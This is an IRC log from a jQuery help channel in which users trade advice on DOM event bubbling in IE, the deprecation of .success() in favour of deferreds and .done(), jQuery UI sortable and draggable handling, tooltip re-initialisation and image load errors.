[14:22:56] <Raynos> I see your point though.
[14:26:27] <Raynos> Going into C++ land and back just to do message passing is madness
[14:26:50] <Raynos> You only want custom events for bubbling and whats the point of making custom events outside the DOM work if you want bubbling
[14:28:09] <snover> There is nothing particularly magical about event bubbling
[14:28:32] <Raynos> You think event bubbling should be emulated in ES land?
[14:29:15] <snover> var parent = this, event = {}; do { parent.dispatchEvent(event); } while (!event.isPropagationStopped() && (parent = this.parentNode));
[14:29:35] <snover> oops
[14:29:38] <snover> parent.parentNode*
[14:30:08] <snover> I didn’t speak to whether or not it should be done, just that it is not magic
[14:31:02] <Raynos> ehm isnt that going to recurse
[14:31:26] <Raynos> not to mention it will throw an error because event is an object not an Event
[14:32:04] <snover> I am just explaining that event bubbling is not magic. Obviously it would not work because in that pseudocode there is nothing attached to the event object.
[14:32:20] <snover> but it is trivially implementable.
[14:32:31] <snover> You haven’t actually explained what you are trying to do
[14:32:53] <snover> just some stuff about how you want to make custom events in IE on detached nodes
[14:32:58] <snover> fire
[14:33:17] <Raynos> I wanted to use EventTarget as a message passing system
[14:33:21] <Raynos> even though its stupidly slow.
[14:33:39] <Raynos> The most non destructive way of getting a new EventTarget I can think of is `document.createElement("fake")`
[14:34:07] <snover> well, stop. it’s a bad idea. :)
[14:34:37] <Raynos> It is but I want to do it. :)
[14:34:52] <snover> too bad. it is impossible to dispatch custom events using IE’s event model.
[14:38:31] <danzik17> is this for a learning experience or something?  otherwise why not just jquery or another existing pubsub library for your message passing?
[14:41:10] <Raynos> danzik17: Specifically it's to remove this hack : https://github.com/Raynos/DOM-shim/blob/master/src/interfaces/EventTarget/props/dispatchEvent.js#L31 in my library
[14:42:09] <snover> good lord.
[14:42:49] <snover> I mean
[14:42:50] <snover> GOOD LAORUD.
[14:43:31] <Raynos> snover: Sensible feedback is welcome.
[14:45:23] <snover> Raynos: So, just so you know, IE’s event model does not guarantee listener call order, so any attempt to use its event model will not get you a correct emulation of DOM Events.
[14:46:13] <Raynos> :(
[14:47:19] <Raynos> snover: http://www.w3.org/TR/domcore/#concept-event-listener-invoke Where does it say they need to be ordered?
[14:48:02] <danzik17> Raynos: it doesn't, it's unspecified.  so microsoft chose the closest thing they could find to unspecified order.  RANDOM.
[14:48:42] <coderDJ412> Yes! I finally did it!
[14:50:08] <Raynos> danzik17: then why do we care? undefined behaviour is undefined
[14:50:15] <snover> stopImmediatePropagation
[14:50:55] <snover> I’m pretty sure I am not making up that interface
[14:50:57] <snover> …
[14:51:42] <snover> no, I’m not. DOM 3 Events.
[14:51:43] <snover> :)
[14:54:08] <Raynos> snover : thanks, that explains why jQuery doesn't use the IE event interface
[14:54:23] <Raynos> ill have to write my own event system :(
[14:55:51] <Raynos> Thanks for your help. You guys know your stuff ;)
[15:17:44] <Helal> hi
[15:18:36] <Helal> pls help me: how i can beale a chat room...
[15:24:44] <Raynos> beale -> build ?
[15:26:32] <binaryfus10nz> does anyone know of a jquery text scroller that has up/down arrow like on http://manos.malihu.gr/tuts/jquery_custom_scrollbar.html but works on iPhone / iPad or need to use both type of scripts?
[15:28:49] <coderDJ412> Anyone here use the PoMMo mailing list script?
[15:47:04] <CannedCorn> what is the best way to use infinite scroll these days
[15:47:13] <CannedCorn> is there a best plugin
[15:53:05] <drublic> is there any chance to get around the double-fired callback when using $('html,body').animate({ scrollTop : 0 }, somefunction);?
[15:57:34] <binaryfus10nz> drublic, maybe something like this? http://jsbin.com/ijaqot/edit#javascript,html
[16:01:44] <drublic> binaryfus10nz: thanks. this seems to be only work with another plugin and i don't want to do this. maybe there's something for detecting if body or html is scrollable
[16:12:55] <binaryfus10nz> hmm does anyone know a scroller that works like this but better? http://tinyurl.com/mggtest ... this 1 just a bit buggy :? :( thoughts?
[16:21:16] <oojacoboo> .load().done()?
[16:21:18] <oojacoboo> is that right
[16:26:39] <wookiehangover> sure
[16:26:58] <wookiehangover> all ajax methods return a deferred object as of 1.4
[16:27:12] <wookiehangover> so any of the deferred callbacks will work
[16:28:22] <ryanneufeld> wookiehangover: success has been deprecated though right?
[16:29:25] <oojacoboo> wookiehangover: done() dosn't work in 1.4
[16:29:33] <oojacoboo> it was released in 1.5… looking to upgrade now
[16:29:42] <oojacoboo> any idea where the depreciated release notes are?
[16:29:47] <ryanneufeld> oojacoboo: try using 1.6
[16:30:04] <oojacoboo> umm yea
[16:30:09] <oojacoboo> I need release notes though ;)
[16:30:11] <wookiehangover> ryanneufeld: success is marked for deprecation in 1.7 and removal in 1.8, yes
[16:31:01] <oojacoboo> awesome, I hope that doesn't apply to $.ajax(success: function(){});
[16:31:14] <ryanneufeld> that still works in 1.6
[16:31:20] <wookiehangover> no, i believe that is still usable
[16:31:24] <oojacoboo> good
[16:31:29] <wookiehangover> even .success() works in 1.6
[16:31:31] <oojacoboo> that'd be a disaster for us
[16:31:35] <ryanneufeld> wookiehangover: it is, I haev production code that uses it
[16:31:36] <wookiehangover> and will continue to work until 1.8
[16:31:41] <danzik17> you sure?  i'd think a breaking change like that would be reserved for 2.0, or do you just mean the .success shortcut to .done
[16:31:50] <oojacoboo> so, where are these release notes?
[16:32:02] <oojacoboo> I need to check all the depreciated functions from 1.4 -> 1.6
[16:32:07] <ryanneufeld> oojacoboo: http://jquery.org/history/
[16:32:08] <oojacoboo> deprecated*
[16:32:10] <ryanneufeld> that might help you
[16:32:20] <wookiehangover> http://bugs.jquery.com/ticket/9399
[16:32:35] <oojacoboo> I see
[16:32:41] <wookiehangover> there's the background on the subject
[16:32:51] <oojacoboo> luckily, I don't think we used .success() anywhere
[16:33:17] <wookiehangover> its a change that can be implemented on an enitre project with search and replace
[16:33:50] <wookiehangover> and given the recent changes to the jquery release cycle, people are going to have to get used to a more dynamic API
[16:33:52] <oojacoboo> wookiehangover: yes, I know
[16:33:56] <oojacoboo> still not comforting
[16:34:03] <wookiehangover> its a small price to pay for more frequent releases
[16:34:22] <oojacoboo> true
[16:34:25] <ryanneufeld> oojacoboo: also no one is forcing you to use the latest version
[16:34:29] <wookiehangover> personally, I think it will make people get more familiar with deferreds
[16:34:41] <wookiehangover> because they're an incredibly powerful construct
[16:34:43] <ryanneufeld> nothing wrong with running a slightly older version if it's working for you
[16:34:49] <oojacoboo> wookiehangover: I love it
[16:35:00] <ryanneufeld> wookiehangover: I am working on learning them better myself
[16:35:03] <wookiehangover> what's awesome is that you can pass them around
[16:35:08] <oojacoboo> of course, I am new to coding js, so I never really had to deal with manually doing deferreds
[16:35:13] <ryanneufeld> in fact, I just re-wrote some code of mine
[16:35:14] <wookiehangover> http://quickleft.com/blog/leveraging-deferreds-in-backbonejs
[16:35:27] <ryanneufeld> to move an ajax call out of a jq ui sortable callback
[16:35:32] <oojacoboo> so, from 1.4 -> 1.6 is there anything that's been deprecated?
[16:35:38] <ryanneufeld> cleaner code
[16:35:44] <oojacoboo> the release notes don't really spell anything out
[16:35:58] <danzik17> oojacoboo: youre going to want to review .attr vs .prop
[16:36:06] <oojacoboo> serious?!
[16:36:13] <ryanneufeld> oojacoboo: yeah, that's about the only really big thing
[16:36:21] <ryanneufeld> between 1.4 and 1.5
[16:36:23] <oojacoboo> attr being deprecated?
[16:36:25] <ryanneufeld> no
[16:36:29] <ryanneufeld> that's not what he said
[16:36:29] <oojacoboo> prop!
[16:36:34] <oojacoboo> yea, don't think we use that
[16:36:42] <ryanneufeld> he said you want to review the diff between them,
[16:36:44] <wookiehangover> oojacoboo: http://blog.jquery.com/2011/01/31/jquery-15-released/
[16:36:50] <oojacoboo> ah
[16:36:52] <ryanneufeld> you can use .prop instead of .attr in some cases
[16:36:56] <wookiehangover> http://blog.jquery.com/2011/05/12/jquery-1-6-1-released/
[16:37:01] <oojacoboo> ryanneufeld: I see
[16:37:12] <wookiehangover> and now attr's been fixed to fallback to prop in some cases
[16:37:51] <oojacoboo> ah
[16:37:58] <oojacoboo> so, prop is the preferred use now?
[16:38:05] <wookiehangover> I thnk addy osmani has a good post explaining it
[16:38:08] <danzik17> only for DOM properties
[16:38:14] <ryanneufeld> ?prop
[16:38:16] <bot-t> .prop(propertyName): [New in v1.6] Get the value of a property for the first element in the set of matched elements. http://api.jquery.com/prop/
[16:38:22] <wookiehangover> oojacoboo: ya its a subtle difference
[16:38:41] <oojacoboo> looks like it just handles a conflict issue
[16:38:47] <oojacoboo> with multiple attributes
[16:38:50] <oojacoboo> or values
[16:39:28] <ryanneufeld> wookiehangover: I'm not sure I understand the move to deprecate those method aliases, I understand that they are aliases. But it's not clear in the bug you shared why they are a Bad Thing
[16:40:18] <danzik17> ryanneufeld: forces people to get used to the *actual* deferred syntax which allows you to have a very normalized interface for a lot of different circumstances
[16:40:26] <danzik17> rather than having aliases in some instances
[16:40:35] <danzik17> it should be aliased for all deferreds or none imo.
[16:40:38] <wookiehangover> I don't think they're necessarily "bad," just confusing
[16:40:51] <ryanneufeld> ah, so it's to clarify a potentially confusing API
[16:41:04] <wookiehangover> yep
[16:41:06] <ryanneufeld> and also lead people in the direction of writing better code?
[16:41:28] <wookiehangover> not better, but just more consistent
[16:41:40] <ryanneufeld> yeah, I suppose better is subjective
[16:42:06] <wookiehangover> dfd = $.ajax( ... ); dfd.success( handler );
[16:42:07] <danzik17> ryanneufeld: consider that using $.when, you can present the same interface whether you're retrieving data from a local cache or from ajax - that's one case where my code has been greatly simplified
[16:42:17] <danzik17> but $.when will not have a .success handler
[16:42:19] <wookiehangover> dfd = somethingDeferred(); dfd.success( handler );
[16:42:44] <wookiehangover> that second example would only work if the deferred was generated by jqxhr
[16:42:51] <ryanneufeld> ah
[16:42:59] <ryanneufeld> therein lies the issue...
[16:43:08] <ryanneufeld> since you can't use success on all deferreds
[16:43:16] <ryanneufeld> the alias shouldn't be there?
[16:43:33] <wookiehangover> ya, by tightening up that API over two releases, it makes it so you can flexibly interchange things that issue deferreds
[16:44:17] <wookiehangover> cause what if at some point you refactored and replaced $.ajax with websockets in an application
[16:44:27] <wookiehangover> but wanted to keep the same callback interfaces
[16:44:46] <ryanneufeld> with using deferreds properly
[16:44:52] <ryanneufeld> you could just swap it out
[16:44:58] <ryanneufeld> and
[16:45:00] <ryanneufeld> ?boom
[16:45:01] <bot-t> "Did you are unimpressed? and now?"
[16:45:01] <wookiehangover> ya, that would be the idea
[16:45:04] <danzik17> wookiehangover: good explanation btw - said it better than i could
[16:45:14] <ryanneufeld> yeah that was great
[16:45:17] <wookiehangover> danzik17: thanks :D
[16:45:35] <CannedCorn> I'm having trouble getting paul irish's infinite scroll working
[16:45:45] <wookiehangover> ?fpi
[16:45:46] <bot-t> fucking paul irish! http://i.imgur.com/gpspl.png
[16:45:46] <CannedCorn> you guys familiar with it at all?
[16:45:59] <CannedCorn> ?
[16:46:23] <ryanneufeld> I r not
[16:51:58] <ryanneufeld> CannedCorn: can you explain what your trouble is?
[16:52:21] <CannedCorn> it doesn't seem to be doing anything, in the console i get Uncaught TypeError: Cannot read property 'debug' of undefined
[16:52:50] <ryanneufeld> well, do you get a stack trace?
[16:54:23] <CannedCorn> seems like this https://github.com/paulirish/infinite-scroll/issues/57
[16:54:24] <socialhapy> ★ Issue #57 on infinite-scroll, reported by likables (4m, 1w ago): Uncaught TypeError: Cannot read property 'debug' of undefined
[16:54:25] <CannedCorn> yeah
[16:55:00] <CannedCorn> my pagination element is present though
[16:55:23] <ryanneufeld> can you paste your code somewhere?
[16:55:31] <ryanneufeld> ?p
[16:55:32] <bot-t> Please paste your code at http://jsfiddle.net/ [preferred], http://paste.pocoo.org/+js, http://jsbin.com/ or http://fixee.org/
[16:57:00] <ryanneufeld> is it considered to be a BadThing to create custom selectors in the $.expr[':'} object wookiehangover?
[16:57:07] <coderDJ412> anyone here use poMMo email list manager?
[16:57:11] <ryanneufeld> or is that JustFineThankYou?
[16:57:32] <ryanneufeld> coderDJ412: is that a jquery plugin?
[16:57:46] <CannedCorn> ah i got it!
[16:57:50] <CannedCorn> thanks guys
[16:58:09] <coderDJ412> ryanneufeld: no, its a php mailinglist manager that I created an AJAX form for
[16:58:13] <wookiehangover> ryanneufeld: no, the selector (and psuedo selector) api is meant to be extended
[16:58:19] <wookiehangover> ben_alman does a good talk about it
[16:59:01] <ryanneufeld> wookiehangover: yeah, I figured, I'm trying to find it
[16:59:03] <devaholic> https://github.com/tblobaum/nodeQuery/blob/master/examples/todos.js
[16:59:20] <ryanneufeld> devaholic ?
[16:59:48] <devaholic> example nquery app
[16:59:58] <ryanneufeld> k, relevance?
[17:00:17] <ryanneufeld> CannedCorn: np, what did we do?
[17:00:23] <devaholic> well its relevant to #jquery, not what u were talking about :P
[17:00:28] <CannedCorn> i had the wrong selecter
[17:00:32] <CannedCorn> selector?
[17:00:45] <ryanneufeld> CannedCorn: ahh yeah, those selectors can be tricksy
[17:03:58] <ryanneufeld> unrelated to jquery, but I <3 zsh + oh-my-zsh
[17:04:12] <aksnowman> Hi, I'm not having any luck so far, I'm trying to figure out if there's any way to set data() vars on something I .append() or .before(), etc w/o having to try assigning each new addition a unique id. ie: var newRow = "<li>some text</li>"; $(this).before( $(newRow).data('key',value) ); inside a .droppable function
[17:04:50] <aksnowman> although this example doesn't seem to work for me, nor several variations I've tried, and anything I can think to search for just brings up the documentation pages for .append(), .before(), etc
[17:04:57] <ryanneufeld> aksnowman: can you paste your code somewhere?
[17:05:03] <ryanneufeld> ?p
[17:05:04] <aksnowman> ryanneufeld: yeah
[17:05:04] <bot-t> Please paste your code at http://jsfiddle.net/ [preferred], http://paste.pocoo.org/+js, http://jsbin.com/ or http://fixee.org/
[17:05:09] <ryanneufeld> jsfiddle is best
[17:05:16] <aksnowman> ryanneufeld: or can you just view-source?
[17:05:18] <ryanneufeld> I just fought with a similar dragon not too long ago
[17:05:26] <ryanneufeld> I can view source, yes, but it's easier with a fiddle
[17:05:28] <aksnowman> the page is entirely html+javascript
[17:05:30] <ryanneufeld> cause I can play with it
[17:05:33] <aksnowman> ahh, k
[17:05:37] <ryanneufeld> and then if I fix it
[17:05:41] <ryanneufeld> you can see what I did to fix it
[17:05:47] <ryanneufeld> it's much more fun that way
[17:05:50] <aksnowman> lol, under maintainance
[17:05:55] <ryanneufeld> dawww
[17:05:56] <ryanneufeld> k
[17:06:01] <ryanneufeld> view source it is!
[17:06:04] <aksnowman> haha
[17:06:14] <aksnowman> http://jrush.dyndns.org:81/scgen/
[17:06:23] <ryanneufeld> I'M PANICING I DON"T HAVE JSFIDDLE
[17:06:32] <ryanneufeld> luls
[17:06:40] <aksnowman> trying to set .data( 'mod', mod ); when a <li> is created in the middle column
[17:06:49] <aksnowman> it's ok! here, breath into this bag... long, slow breaths!
[17:06:51] <aksnowman> haha
[17:06:56] <ryanneufeld> shell code huh
[17:07:10] <ryanneufeld> you'll have to explain what this is later
[17:07:17] <aksnowman> lol, k
[17:07:21] <aksnowman> can do :)
[17:07:36] <ryanneufeld> or now
[17:07:40] <aksnowman> hahaha
[17:07:43] <ryanneufeld> cause I have no idea what it's doing lol
[17:08:07] <aksnowman> I'm making a tool to help w/ teaching hacking/security/whatever
[17:08:14] <aksnowman> for creating custom shellcode
[17:08:17] <aksnowman> you select modules on the left
[17:08:26] <aksnowman> (clicking appends, and that works fine)
[17:08:31] <aksnowman> they're already sortable, etc
[17:08:42] <aksnowman> you can customize the inputs on each module, modules can be used multiple times
[17:08:58] <aksnowman> hten you click the 'update' button and it outputs it in a number of formats
[17:09:04] <ryanneufeld> aaaahhhh
[17:09:08] <aksnowman> my issue is I've finally got dragging modules to the middle of the chain working
[17:09:13] <ryanneufeld> are you using connectToSortable ?
[17:09:30] <ryanneufeld> ah no, you're not
[17:09:33] <aksnowman> but I don't know how to get my .data('mod', mod) working on the stuff I'm inserting
[17:09:37] <aksnowman> no, I'm not
[17:09:42] <ryanneufeld> damnit
[17:09:47] <ryanneufeld> where is jsfiddle when you need it
[17:09:51] <aksnowman> I'm kinda in my first major forey(sp) into jquery, heh
[17:09:59] <mansu> I am working on a web app where some of the divs are hidden and upon a click, the divs are shown. Upon a click I am cloning the div and adding it to the DOM. However, some of these DIVs have tool tips that are shown using the tiptip plugin. Upon page load I initialize all the tool tips using the tiptip plugin. But it seems that the tool don't show up in the cloned divs... I am trying to figure out why the tooltips are not clones
[17:09:59] <wookiehangover> ryanneufeld: iknowrite
[17:10:00] <ryanneufeld> I have a fiddle that is a great example of how to do this
[17:10:02] <mansu> *cloned
[17:10:09] <Axsuul> how would i call functions/methods within a jquery function?
[17:10:28] <ryanneufeld> Axsuul: like you would any other function/metho
[17:11:02] <ryanneufeld> aksnowman: you have html comments in your JS
[17:11:06] <Axsuul> ryanneufeld: sorry, from outside the jquery function
[17:11:14] <ryanneufeld> aksnowman: that doesn't do what you think it does
[17:11:24] <aksnowman> ryanneufeld: ahh, k, haha
[17:11:35] <aksnowman> it'd be /* */ then?
[17:11:44] <ryanneufeld> in JS code you use // for one liners
[17:11:50] <razzi> mansu, after you add  the divs to the dom, init them again for that tiptip thing, or else somehow see if you can use livequeries
[17:11:54] <aksnowman> I've always done PHP/MySQL, just getting into jquery/javascript
[17:11:55] <ryanneufeld> and you can wrap larger comments in /* */
[17:11:57] <ryanneufeld> yeah
[17:12:14] <ryanneufeld> ?live @mansu
[17:12:15] <bot-t> mansu, .live(eventType, handler): Attach a handler to the event for all elements which match the current selector, now and in the future. http://api.jquery.com/live/
[17:12:26] <ryanneufeld> mansu: using live will do what you want with tip top
[17:12:28] <ryanneufeld> *tiptip
[17:12:35] <ryanneufeld> mansu: or you can use delegate
[17:12:43] <ryanneufeld> I'm not sure which is recommended
[17:12:48] <ryanneufeld> but both will do the job
[17:13:15] <mansu> ryanneufeld:  hmm... my init step looks like... $(".nodelink[title]").tipTip();
[17:13:17] <ryanneufeld> aksnowman: you should be noticing the js errors in your console
[17:13:23] <mansu> how do I rewrite it using live?
[17:13:58] <aksnowman> ryanneufeld: haha, was just gonna mention it was odd I hadn't seen any errors from the comments in firebug
[17:14:01] <aksnowman> XD
[17:14:23] <coldhead> mansu: you probably want to just apply tiptip again wherever your code is inserting new elements
[17:14:28] <aksnowman> ok, think they're all changed over...
[17:15:01] <ryanneufeld> aksnowman: try sorting
[17:15:13] <mansu> coldhead: yeah that'w what I have been thinking... so figuring out the syntax to choose an element of class node and having a certain id
[17:15:30] <ryanneufeld> mansu: if it has an id
[17:15:37] <ryanneufeld> class is not required
[17:15:40] <aksnowman> ryanneufeld: sorting is working perfectly in ff
[17:15:44] <ryanneufeld> not in chrome
[17:15:50] <aksnowman> oh?
[17:15:52] * aksnowman tries
[17:16:02] <ryanneufeld> Uncaught TypeError: Cannot read property 'html' of undefined
[17:16:10] <ryanneufeld> line 206 of scgen.js
[17:16:16] <aksnowman> XD
[17:16:19] <aksnowman> ok
[17:16:45] <oojacoboo> can someone tell me if I am missing something with this .done(), it doesn't seem to be working… http://pastie.org/2780650
[17:17:05] <aksnowman> ryanneufeld: one sec, I think I know what I did there...
[17:17:11] <Axsuul> ryanneufeld: i want to be able to clal changeValue() from outside the jquery function: https://gist.github.com/0e03f8bd77eba9d295c1
[17:17:15] <ryanneufeld> aksnowman: http://jqueryui.com/demos/draggable/#sortable
[17:17:26] <ryanneufeld> get your code working with that first
[17:17:47] <aksnowman> ryanneufeld: yeah, working on it
[17:17:55] <Axsuul> ryanneufeld: or should i bind it to event instead?
[17:17:55] <ryanneufeld> Axsuul: jQuery.fn.rangeSlider.changeValue()
[17:18:01] <aksnowman> it was working until I tried getting the drag+drop stuff working, heh
[17:18:10] <Axsuul> ryanneufeld: ahh what.. so intuitive.. thanks ill try that
[17:18:11] <ryanneufeld> Axsuul: like I said. just like you would a normal method :)
[17:18:17] <ryanneufeld> lol
[17:18:29] <Axsuul> ah ok i see what you meant, thanks
[17:18:45] <ryanneufeld> aksnowman: I recently built a pretty cool thing using sortable and draggable
[17:19:01] <ryanneufeld> aksnowman: which is why I wish that I had jsfiddle working :S
[17:19:14] <aksnowman> ahh
[17:19:20] <aksnowman> that would just be too convenient, haha
[17:19:25] <ryanneufeld> yeah, if you did it right
[17:19:34] <ryanneufeld> sortable has an receive method
[17:19:39] <ryanneufeld> and the funny thing is
[17:19:43] <ryanneufeld> that when it recieves
[17:19:53] <ryanneufeld> it doesn't remove the ui-draggable from the last added time
[17:19:55] <ryanneufeld> *item
[17:20:06] <ryanneufeld> so you can use that to find the most recent one added
[17:20:10] <aksnowman> haha, nice
[17:20:14] <aksnowman> that'd work perfectly
[17:20:26] <ryanneufeld> yeah, which is why I was *really* hoping for jsfiddle
[17:20:43] <ryanneufeld> I wish the guy would open it up so i could run my own instance
[17:20:44] <ryanneufeld> :P
[17:20:49] <ryanneufeld> *that* would be cool
[17:21:11] <ryanneufeld> great, now it's 404
[17:21:14] <Axsuul> hmm yea jsfiddle is down?
[17:21:17] <aksnowman> I just wish it wasn't in maintainance, 'cause it sounds extremely helpful, haha
[17:21:23] <ryanneufeld> yeah
[17:21:23] <aksnowman> Axsuul: yeah, maintainance
[17:21:50] <ryanneufeld> aksnowman: do you happen to have skype?
[17:21:58] <aksnowman> ryanneufeld: so I get rid of the .droppable() completely? just using .sortable() and .draggable() ?
[17:22:02] <aksnowman> yeah
[17:22:06] <ryanneufeld> aksnowman: yes
[17:22:12] <ryanneufeld> drop the droppable
[17:36:57] <aksnowman> ryanneufeld: any chance I could get a pastebin/whatever of those 2 functions to reference? lol
[17:37:10] <ryanneufeld> which ones?
[17:37:20] <ryanneufeld> basically its the sortable receive
[17:37:27] <ryanneufeld> and you're looking for items with the ui-draggable
[17:37:39] <aksnowman> yeah, the receive part, I guess
[17:37:39] <ryanneufeld> aksnowman: http://jqueryui.com/demos/draggable/#sortable
[17:37:48] <ryanneufeld> That's how you set it up
[17:37:53] <aksnowman> lol, I'm looking @ that source
[17:38:01] <ryanneufeld> and then it's just the receive method in the sortable
[17:38:12] <aksnowman> k, receive in sortable, thanks :)
[17:38:41] <ryanneufeld> np
[17:40:03] <ryanneufeld> jsfiddle is back
[17:40:07] <ryanneufeld> all rejoice!
[17:40:20] <ryanneufeld> aksnowman: http://jsfiddle.net/ryanneufeld/pxeHT/
[17:40:21] <aksnowman> yay!
[17:40:24] * aksnowman checks it out
[17:41:14] <aksnowman> ohh, that's pretty cool :P
[17:41:18] * aksnowman bookmarks jsfiddle
[17:41:31] <ryanneufeld> yeah, simplified version of what I showed you on skype
[17:41:39] <ryanneufeld> but that's the point
[17:41:50] <ryanneufeld> looks like they just added some new features too
[17:43:36] <ryanneufeld> aksnowman: does the fiddle clear it up for you a bit better?
[17:43:43] <aksnowman> ryanneufeld: yeah
[17:44:09] <ryanneufeld> cool
[17:44:12] <ryanneufeld> glad to hear it
[17:51:05] <Nicolas_Leonida2> hi
[17:51:18] <Nicolas_Leonida2> I'm trying to remove the images that do not exist from the page
[17:51:28] <Nicolas_Leonida2> this is my code $('img').error(function() {           $(this).detach();        });
[17:51:41] <Nicolas_Leonida2> but it is not triggered when an image doesn't exist
[17:51:42] <Nicolas_Leonida2> why?
[17:52:13] <oojacoboo> is it possible to chain .load() and .done() together?  I'm trying to do a .fadeIn() on .done(), but after the .don() completes, it displays the content, so I get a flicker effect
[17:52:40] <Nicolas_Leonida2> does this only work in IE?
[17:57:18] <coldhead> i guess that event doesn't fire reliably if an image isn't there, Nicolas_Leonida2
[17:57:36] <coldhead> you might need to try a different approach
[17:57:46] <Nicolas_Leonida2> coldhead I noticed this works http://www.w3schools.com/jsref/tryit.asp?filename=tryjsref_img_onerror
[17:58:13] <joeytwiddle> i have used the normal DOM event successfully.  let's blame jquery!
[17:59:49] <coldhead> hmm, the docs seem to say it should work, Nicolas_Leonida2
[18:00:15] <coldhead> i've usually gone the other way, and only added images to the page when they're successfully loaded
[18:00:22] <Nicolas_Leonida2> coldhead: http://api.jquery.com/error/ on this page it says "To hide the "broken image" icons for IE users, you can try:"
[18:00:52] <Nicolas_Leonida2> what benefit does that have?
[18:01:12] <coldhead> the main benefit was that i thought it was the only way to do it :P
[18:01:35] <coldhead> i think they mention IE in that example because it has especially hideous image missing thumbnails
[18:01:43] <coldhead> not because it only works there
[18:02:06] <Nicolas_Leonida2> I see,
[18:02:21] <Nicolas_Leonida2> so what seems to be wrong in my code? maybe my selector doesn't select all images?
[18:03:58] <coldhead> no it's failing for me in chromium
[18:04:32] <coldhead> MAYBE error doesn't always fire if an image is not found
[18:04:38] <coldhead> depending on the browser
[18:04:44] <coldhead> and maybe it works in IE
[18:05:10] <Nicolas_Leonida2> oh the problem was that it was inside document ready event
[18:07:00] <coldhead> ah
[18:07:12] <coldhead> see also fitzy's comments http://api.jquery.com/error/#comment-34139831
[18:07:24] <coldhead> in conclusion, image loading is fraught with peril
[18:07:57] <coldhead> Nicolas_Leonida2: http://jsfiddle.net/4brXU/
[18:08:02] <coldhead> that's more what i have used
[18:08:23] <coldhead> although from memory some browsers won't trigger load if the image is cached
[18:09:35] <rosshadden> I remember reading a page loading speed article (Smashing Mag, I think) that gave results from studies saying how long people usually got pissed after. Does anyone know what article I'm talking about? I need to cite it in a report.
[18:09:45] <coldhead> this is probably a nicer way http://jsfiddle.net/4brXU/1/
[18:11:00] <coldhead> i've read several conflicting things, rosshadden, but this one has a fancy title at least http://www.websiteoptimization.com/speed/tweak/psychology-web-performance/
[18:11:42] <rosshadden> coldhead: Thank you. This isn't the exact article I read, but it's good enough for this lame tech writing class.
[18:13:17] <oojacoboo> can I deferred the data with .load and .get without having to write a custom deferred function?
[18:14:06] <oojacoboo> or pass the data to the deferred .done() function rather
[18:14:56] <rosshadden> oojacoboo: I don't think you can with either .load or $.get. But you can if you use $.ajax, which can do anything you want to with those anyway.
[18:15:03] <rosshadden> http://api.jquery.com/category/deferred-object/
[18:15:22] <oojacoboo> rosshadden: I'd just have to use success: ?
[18:16:35] <rosshadden> oojacoboo: Either success, or use the $.when().done() concept.
[18:16:37] <oojacoboo> this seems to me like it'd be very common to use the data in the defreed
[18:17:01] <oojacoboo> without having to write custom functions
[18:17:37] <rosshadden> You can, you can definitely pass the data response from an ajax call, but you either have to write a custom deferred or use $.ajax. It may work with $.get since that is just a specialization of $.ajax.
[18:19:06] <oojacoboo> mmm
[18:19:13] <rosshadden> oojacoboo: I was wrong, you can do it with $.get
[18:19:38] <rosshadden> so for instance: $.get('asdf.html').success(function(data));
[18:19:47] <oojacoboo> ha, yea… was about to post, thanks!
[18:19:53] <oojacoboo> no no
[18:19:55] <oojacoboo> no success()
[18:20:01] <oojacoboo> that's getting deprecated
[18:20:06] <oojacoboo> you mean .done, right
[18:20:09] <rosshadden> Yeah, what is it now, done?
[18:20:10] <rosshadden> yea
[18:23:44] <oojacoboo> rosshadden: what would I do with that data .html(data);
[18:23:48] <oojacoboo> something like that?
[18:24:28] <mengu_> hello everyone. i'm using jquery replaceText plugin. it is working great. https://github.com/cowboy/jquery-replacetext/blob/master/jquery.ba-replacetext.js this one.
[18:24:36] <mengu_> i've got only one problem which is a deal breaker for me.
[18:24:51] <rosshadden> oojacoboo: Yeah, so in that case,
[18:25:08] <mengu_> let's say i have an element like <p>some text here <a href="">some link here</a> and some more text here</p>
[18:25:28] <rosshadden> $.get('asdf.html').done(function(data){  $('#whatever').html(data);  });
[18:25:43] <mengu_> it doesn't replace when the structure is like that.
[18:25:48] <mengu_> how should i proceed?
[18:26:03] <oojacoboo> rosshadden: yea, that's what I did
[18:26:16] <rosshadden> Did it work?
[18:26:17] <oojacoboo> I guess… the issue is that I'm trying to get a fadeOut and fadeIn
[18:26:35] <oojacoboo> but I get a jitter b/c of the events firing at the wrong times
[18:26:54] <rosshadden> Can you link me to something, or make a jsfiddle I can play with?
[18:27:41] <oojacoboo> rosshadden: http://jsfiddle.net/BuKRT/
[18:27:45] <Blaster> does anyone know how I could have jquery attempt to load an image every 2 seconds?  Once the image is created then it is shown?
[18:27:54] <Blaster> I'd probably use settimeout and load() right?
[18:28:46] <coldhead> load is for html
[18:28:50] <Blaster> oh
[18:29:01] <Blaster> so just settimeout on a function which loads the image
[18:29:02] <rosshadden> Blaster: You can accomplish that with JavaScript, not even jQuery. Lemme explain
[18:29:28] <coldhead> you probably want something like $('img', {src: 'someimage.jpg'}).appendTo('body')
[18:29:43] <coldhead> and recursive setTimeout
[18:29:49] <Blaster> well it needs to first get the SRC from the img element, and attempt to re load that every 5 seconds for example
[18:29:52] <rosshadden> Blaster: var img = new Image();   img.src = 'asdf.jpg';   img.onload = function(){  //write code to show image here };
[18:30:08] <rosshadden> Blaster: That way the image is not shown until it is successfully loaded.
[18:30:42] <Blaster> so it will wait until the image has been physically uploaded to the server before showing it?
[18:30:52] <Blaster> without refreshing
[18:31:10] <rosshadden> Well, it will wait until the browser thinks the image is loaded
[18:31:39] <rosshadden> I've never tested it with an image that isn't fully uploaded. I'm not sure if it would do what you want, or just try and load a partially uploaded file. But I would imagine it would work.
[18:31:51] <rosshadden> Doesn't hurt to try, huh? :)
[18:32:05] <Blaster> i think settimeout would be needed in my case
[18:32:05] <coldhead> ?tias // !!!
[18:32:06] <bot-t> Try It And See
[18:32:25] <Blaster> so it attempts to reload the image every 2 seconds or something
[18:32:56] <rosshadden> In most cases (in all cases), setTimeout is the wrong way to go. But if it suits your need then by all means go for it. But no matter what you do, follow coldhead's advice and TIAS.
[18:33:51] <Blaster> can I put that plain JS code inside the jquery function?
[18:33:55] <Blaster> or should I be putting it outside?
[18:34:38] <rosshadden> oojacoboo: http://jsfiddle.net/BuKRT/1/
[18:34:41] <Blaster> why is setTimeout a bad thing?
[18:35:02] <oojacoboo> rosshadden: ah!
[18:35:11] <coldhead> setInterval is a bad thing, if that's what you mean
[18:35:18] <oojacoboo> I didn't know you could use the second argument there like that
[18:35:22] <coldhead> ?g zetafleet setinterval harmful
[18:35:22] <oojacoboo> thanks!
